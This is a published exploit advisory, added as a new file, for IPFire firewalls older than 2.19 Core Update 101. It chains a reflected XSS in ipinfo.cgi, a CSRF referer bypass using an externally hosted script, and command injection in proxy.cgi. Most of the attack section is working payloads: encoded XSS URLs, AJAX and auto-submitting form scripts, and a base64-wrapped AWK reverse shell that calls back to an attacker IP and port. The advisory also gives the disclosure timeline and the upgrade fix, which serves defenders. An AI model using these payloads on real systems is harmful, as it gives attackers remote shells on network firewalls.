@@ -1,0 +1,252 @@
+######################################################################################
+# Exploit Title: IPFire < 2.19 Update Core 101 XSS to CSRF to Remote Command Execution
+# Date: 04/05/2016
+# Author: Yann CAM @ Synetis - ASafety
+# Vendor or Software Link: www.ipfire.org
+# Version: lesser-than 2.19 Core Update 101
+# Category: Remote Command Execution / XSS
+# Google dork:
+# Tested on: IPFire distribution
+######################################################################################
+ 
+ 
+IPFire firewall/router distribution description :
+======================================================================
+ 
+IPFire is a free Linux distribution which acts as a router and firewall in the first instance. It can be maintained via 
+a web interface. The distribution furthermore offers selected server daemons and can easily be expanded to a SOHO server.
+
+IPFire is based on Linux From Scratch and is, like the Endian Firewall, originally a fork from IPCop. Since Version 2, 
+only IPCop's web interface is used.
+
+
+Vulnerability description :
+======================================================================
+
+As others linux-router based firewall that I've tested and analyzed, IPFire (based on IPCop) have some vulnerabilities.
+Through an XSS, it's possible to bypass CSRF-referer checking and exploit a Remote Command Execution to gain a full reverse-shell.
+The method detailed below is very similar to the one presented in my previous article for IPCop some year ago.
+
+IPCop 2.1.4 Remote Command Execution : https://www.asafety.fr/vuln-exploit-poc/xss-rce-ipcop-2-1-4-remote-command-execution/
+
+ 
+Proof of Concept 1 :
+======================================================================
+ 
+A non-persistent XSS in GET param is available in the ipinfo.cgi. The injection can be URLencoded with certain browsers 
+or blocked with Anti-XSS engine.
+This XSS works on IE and affect IPFire version < 2.19 Core Update 101.
+ 
+File /srv/web/ipfire/cgi-bin/ipinfo.cgi line 87 :
+    &Header::openbox('100%', 'left', $addr . ' (' . $hostname . ') : '.$whoisname);
+ 
+PoC: 
+https://<IPFire>:444/cgi-bin/ipinfo.cgi?<script>alert(/RXSS-Yann_CAM_-_Security_Consultant_@ASafety_-_SYNETIS/)</script>
+ 
+ 
+Proof of Concept 2 :
+======================================================================
+ 
+CSRF exploit bypass from previous XSS.
+IPFire is protected against CSRF attack with a referer checking on all page.
+It's possible to bypass this protection with the previous XSS detailed.
+To do this, load a third party JS script with the XSS, and make Ajax request over IPFire context (so with the right referer).
+This XSS works on IE and affect IPFire version < 2.19 Core Update 101.
+ 
+File /srv/web/ipfire/cgi-bin/ipinfo.cgi line 87 :
+    &Header::openbox('100%', 'left', $addr . ' (' . $hostname . ') : '.$whoisname);
+ 
+PoC :
+
+Host a third party JS script on a web server accessible from IPFire. In this JS script, load JQuery dynamically and perform any AJAX request to an IPFire targeted page.
+All AJAX request bypass the CSRF protection.
+
+ * Third party JS script, host in http://<PENTESTER_WEBSITE>/x.js:
+ 
+var headx=document.getElementsByTagName('head')[0];
+var jq= document.createElement('script');
+jq.type= 'text/javascript';
+jq.src= 'http://code.jquery.com/jquery-latest.min.js';
+headx.appendChild(jq);
+function loadX(){ // AJAX CSRF bypass referer checking !
+    $.ajax({
+      type: 'POST',
+      url: "https://<IPFire_IP>:444/cgi-bin/<TARGETED_PAGE>",
+      contentType: 'application/x-www-form-urlencoded;charset=utf-8',
+      dataType: 'text',
+      data: '<YOUR_DATA>'
+    }); // payload of your choice
+  }
+setTimeout("loadX()",2000);
+
+ * XSS to load dynamically this third party script :
+
+var head=document.getElementsByTagName('head')[0];var script= document.createElement('script');script.type= 'text/javascript';script.src= 'http://<PENTESTER_WEBSITE>/x.js';head.appendChild(script);
+
+ * Escape this string with escape() Javascript method :
+
+%76%61%72%20%68%65%61%64%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%27%68%65%61%64%27%29%5B%30%5D%3B%76%61%72%20%73%63%72%69%70%74%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%73%63%72%69%70%74%2E%74%79%70%65%3D%20%27%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%27%3B%73%63%72%69%70%74%2E%73%72%63%3D%20%27%68%74%74%70%3A%2F%2F%31%39%32%2E%31%36%38%2E%31%35%33%2E%31%2F%78%2E%6A%73%27%3B%68%65%61%64%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%73%63%72%69%70%74%29%3B%0A%09%09%09
+
+ * Make the final URL with XSS in GET param that load dynamically the third party script (IE) :
+
+https://<IPFire_IP>:8443/cgi-bin/ipinfo.cgi?<script>eval(unescape("%76%61%72%20%68%65%61%64%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%27%68%65%61%64%27%29%5B%30%5D%3B%76%61%72%20%73%63%72%69%70%74%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%73%63%72%69%70%74%2E%74%79%70%65%3D%20%27%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%27%3B%73%63%72%69%70%74%2E%73%72%63%3D%20%27%68%74%74%70%3A%2F%2F%31%39%32%2E%31%36%38%2E%31%35%33%2E%31%2F%78%2E%6A%73%27%3B%68%65%61%64%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%73%63%72%69%70%74%29%3B%0A%09%09%09"))</script>
+ 
+
+Proof of Concept 3 :
+======================================================================
+ 
+Remote Command Execution in the proxy.cgi file. This file is protected from CSRF execution.
+Affected version < 2.19 Core Update 101.
+
+File /srv/web/ipfire/cgi-bin/proxy.cgi line 4137 :
+    system("/usr/sbin/htpasswd -b $userdb $str_user $str_pass");
+
+The $str_pass isn't sanitized before execution in command line. It's possible to change the "NCSA_PASS" and "NCSA_PASS_CONFIRM" post data with arbitrary data.
+
+
+
+So the RCE can be exploited with this PoC (if the Referer is defined to IPFire URL) :
+
+<html>
+  <body>
+    <form name='x' action='https://<IPFire_IP>:444/cgi-bin/proxy.cgi' method='post'>
+      <input type='hidden' name='NCSA_PASS' value='||touch /tmp/x;#' />
+      <input type='hidden' name='NCSA_PASS_CONFIRM' value='||touch /tmp/x;#' />
+	  <input type='hidden' name='NCSA_USERNAME' value='yanncam' />
+      <input type='hidden' name='ACTION' value='Ajouter' />
+    </form>
+    <script>document.forms['x'].submit();</script>
+  </body>
+</html>
+
+Note that the ACTION POST param depend on the IPFire language defined.
+
+
+Proof of Concept 4 :
+======================================================================
+
+Finally, with these three previous PoC, it's possible to combine all the mechanisms to gain a full reverse-shell on IPFire.
+IPFire does not have netcat nor telnet, socat, python, ruby, php etc ...
+The only way to make a reverse-shell is to use Perl or AWK technics. In this PoC, it's the AWK technic that is used :
+(From ASafety Reverse-shell cheat-sheet : http://www.asafety.fr/vuln-exploit-poc/pentesting-etablir-un-reverse-shell-en-une-ligne/)
+
+ * The reverse-shell one-line with AWK is :
+
+awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+ * To bypass IPFire filter, you need to encode this command in base64 (after modify <IP> and <PORT>) :
+
+YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsgfX0nIC9kZXYvbnVsbA==
+
+ * Place a \n at each bloc of 64 chars in the base64 version :
+
+YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==
+
+ * This payload can be echo'ed and decoded with openssl, on the fly, into IPFire :
+
+echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d
+
+ * To execute this payload, add backticks and eval call :
+
+eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`
+
+ * Your payload is ready to be used into POST param in proxy.cgi, like the previous PoC :
+
+||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC88SVA+LzxQT1JUPiI7IHdoaWx\nlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIG\nM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8J\niBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsg\nfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`;#
+
+ * Full PoC (IPFire < 2.19 Core Update 101) 
+ (if the referer is defined to IPFire URL, and a netcat is listening # nc -l -vv -p 1337) :
+
+<html>
+  <body>
+    <form name='x' action='https://<IPFire_IP>:444/cgi-bin/proxy.cgi' method='post'>
+      <input type='hidden' name='NCSA_PASS' value='||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjAuMi8xMzM3Ijsg\nd2hpbGUoNDIpIHsgZG97IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxp\nbmUgYzsgaWYoYyl7IHdoaWxlICgoYyB8JiBnZXRsaW5lKSA+IDApIHByaW50ICQw\nIHwmIHM7IGNsb3NlKGMpOyB9IH0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMp\nOyB9fScgL2Rldi9udWxs" | openssl enc -a -d`;#' />
+      <input type='hidden' name='NCSA_PASS_CONFIRM' value='||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjAuMi8xMzM3Ijsg\nd2hpbGUoNDIpIHsgZG97IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxp\nbmUgYzsgaWYoYyl7IHdoaWxlICgoYyB8JiBnZXRsaW5lKSA+IDApIHByaW50ICQw\nIHwmIHM7IGNsb3NlKGMpOyB9IH0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMp\nOyB9fScgL2Rldi9udWxs" | openssl enc -a -d`;#' />
+	  <input type='hidden' name='NCSA_USERNAME' value='yanncam' />
+      <input type='hidden' name='ACTION' value='Ajouter' />
+    </form>
+    <script>document.forms['x'].submit();</script>
+  </body>
+</html>
+
+Note that none <IP>/<Port> are defined in the previous payload, you need to reproduce these different steps.
+
+ * With the XSS method to bypass CSRF Referer checking, the third party JS script can be :
+
+var headx=document.getElementsByTagName('head')[0];
+var jq= document.createElement('script');
+jq.type= 'text/javascript';
+jq.src= 'http://code.jquery.com/jquery-latest.min.js';
+headx.appendChild(jq);
+function loadX(){ // AJAX CSRF bypass referer checking !
+    $.ajax({
+      type: 'POST',
+      url: "https://<IPFire_IP>:444/cgi-bin/proxy.cgi",
+      contentType: 'application/x-www-form-urlencoded;charset=utf-8',
+      dataType: 'text',
+      data: 'NCSA_USERNAME=yanncam&ACTION=Ajouter&NCSA_PASS=||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjEuMzIvMTMzNyI7\nIHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRs\naW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAk\nMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShz\nKTsgfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`;#&NCSA_PASS_CONFIRM=||eval `echo -e "YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC8xOTIuMTY4LjEuMzIvMTMzNyI7\nIHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRs\naW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAk\nMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShz\nKTsgfX0nIC9kZXYvbnVsbA==" | openssl enc -a -d`;#'
+    });
+  }
+setTimeout("loadX()",2000);
+
+ * A demonstration video has been realised as PoC here (IPFire < 2.19 Core Update 101) : https://www.youtube.com/watch?v=rBd21aXU83E
+
+
+Solution:
+======================================================================
+- Upgrade to IPFire 2.19 Core Update 101
+
+I just want to thank Michael TREMER for his availability, his kindness, his correction speed and quality of the IPFire project I am a regular user.
+
+
+Report timeline :
+======================================================================
+ 
+2016-04-03 : Vulnerabilities discovered in the latest IPFire version
+2016-04-04 : IPFire team alerted with details and PoC through forum and bugtracker
+2016-04-05 : Several exchanges between Michael TREMER and me on the BugTracker to fix these vulnerabilities
+2016-04-05 : CVE assigment request sent by IPFire team
+2016-04-06 : CVE ID denied without any reason, emailed back
+2016-04-08 : CVE ID denied again without any reason
+2016-04-27 : IPFire 2.19 Core Update 101 available for testing
+2016-05-02 : IPFire 2.19 Core Update 101 released
+
+ 
+Additional resources :
+======================================================================
+ 
+- www.ipfire.org
+- www.ipfire.org/news/ipfire-2-19-core-update-101-released
+- planet.ipfire.org/post/ipfire-2-19-core-update-101-is-available-for-testing
+- www.ubuntufree.com/ipfire-2-19-core-update-101-patches-cross-site-scripting-vulnerability-in-web-ui/
+- news.softpedia.com/news/ipfire-2-19-core-update-101-patches-cross-site-scripting-vulnerability-in-web-ui-503608.shtml
+- www.openwall.com/lists/oss-security/2016/04/05/5
+- seclists.org/oss-sec/2016/q2/15
+- www.synetis.com
+- www.asafety.fr
+- www.youtube.com/watch?v=rBd21aXU83E
+ 
+ 
+Credits :
+======================================================================
+ 
+    88888888
+   88      888                                         88    88
+  888       88                                         88
+  788           Z88      88  88.888888     8888888   888888  88    8888888.
+   888888.       88     88   888    Z88   88     88    88    88   88     88
+       8888888    88    88   88      88  88       88   88    88   888
+            888   88   88    88      88  88888888888   88    88     888888
+  88         88    88  8.    88      88  88            88    88          888
+  888       ,88     8I88     88      88   88      88   88    88  .88     .88
+   ?8888888888.     888      88      88    88888888    8888  88   =88888888
+       888.          88
+                    88    www.synetis.com
+                 8888  Consulting firm in management and information security
+ 
+Yann CAM - Security Consultant @ Synetis | ASafety
+ 
+ 
+--
+SYNETIS | ASafety
+CONTACT: www.synetis.com | www.asafety.fr
